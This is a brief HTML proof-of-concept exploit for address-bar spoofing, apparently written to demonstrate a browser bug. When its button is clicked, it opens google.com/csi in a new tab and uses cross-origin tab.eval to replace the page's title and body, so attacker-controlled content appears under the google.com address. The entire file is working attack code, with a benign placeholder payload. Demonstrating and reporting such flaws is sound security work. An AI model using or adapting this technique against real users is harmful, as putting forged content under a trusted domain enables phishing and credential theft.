<!DOCTYPE html>
<html>
<body>
<button onclick="run()">RUN</button>
<pre id="status">...</pre>
<script>
function run() {
  var tab = window.open("https://www.google.com/csi", "_blank");
  if (!tab) { document.getElementById('status').textContent = 'Popup blocked!'; return; }
  setTimeout(function () {
    try {
      tab.eval(
        "document.title='Google';" +
        "document.body.style.cssText='font-family:Arial;text-align:center;padding:48px';" +
        "document.body.innerHTML = '<h1>This Is Not Google</h1>' +" +
        "'<p>Spoof PoC — bar shows google.com, content is attacker-controlled.</p>';"
      );
      document.getElementById('status').textContent = 'Injected! Check the new tab.';
    } catch (e) { document.getElementById('status').textContent = 'Failed: ' + e.message; }
  }, 800);
}
</script>
</body>
</html>
